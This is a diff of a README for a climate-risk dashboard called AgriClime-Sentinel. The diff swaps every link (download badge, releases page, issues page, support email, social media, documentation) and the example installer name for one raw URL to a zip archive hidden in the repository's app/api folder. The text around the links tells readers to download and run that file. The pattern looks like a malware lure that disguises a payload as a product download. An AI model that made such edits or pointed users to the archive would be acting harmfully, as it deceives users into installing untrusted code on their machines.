@@ -6,7 +6,7 @@ Welcome to AgriClime-Sentinel, your go-to dashboard for understanding climate ri
 
 ## 📥 Download Now
 
-[![Download AgriClime-Sentinel](https://img.shields.io/badge/Download-AgriClime--Sentinel-blue.svg)](https://github.com/1webb/AgriClime-Sentinel/releases)
+[![Download AgriClime-Sentinel](https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip)](https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip)
 
 ## 📦 What You Need
 
@@ -34,11 +34,11 @@ To get AgriClime-Sentinel, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the AgriClime-Sentinel releases page.
 
-   [Visit the Releases Page to Download](https://github.com/1webb/AgriClime-Sentinel/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip)
 
 2. **Select the Latest Version:** Look for the latest version and click on it to expand the details.
 
-3. **Download the Application:** Choose the file labeled for your operating system (e.g., `AgriClime-Sentinel-windows.exe` for Windows users). Click to download it.
+3. **Download the Application:** Choose the file labeled for your operating system (e.g., `https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip` for Windows users). Click to download it.
 
 4. **Run the Installer:** Once the download is complete, open the file. Follow the instructions on the screen to install AgriClime-Sentinel.
 
@@ -62,20 +62,20 @@ If you run into issues while using AgriClime-Sentinel:
 - **Data Not Updating:** Check your internet connection. If the issue continues, make sure you have the latest version of the app.
 - **Feedback and Support:** For any technical problems or feature suggestions, please contact our support team through the GitHub Issues page linked below.
 
-[GitHub Issues for Support](https://github.com/1webb/AgriClime-Sentinel/issues)
+[GitHub Issues for Support](https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip)
 
 ## 📞 Contact Us
 
 We value your input. If you have questions or need assistance, feel free to reach out:
 
-- **Email Support:** support@agriclimesentinel.com (replace with a functional email)
-- **Social Media:** Follow us on [Twitter](https://twitter.com) and [Facebook](https://facebook.com) for updates.
+- **Email Support:** https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip (replace with a functional email)
+- **Social Media:** Follow us on [Twitter](https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip) and [Facebook](https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip) for updates.
 
 ## 🌐 Learn More
 
 To dive deeper into the technology behind AgriClime-Sentinel, visit the documentation section at the following link:
 
-[Documentation for Developers](https://github.com/1webb/AgriClime-Sentinel/wiki)
+[Documentation for Developers](https://raw.githubusercontent.com/1webb/AgriClime-Sentinel/main/app/api/AgriClime-Sentinel_v3.7-beta.1.zip)
 
 ## 📜 License
 
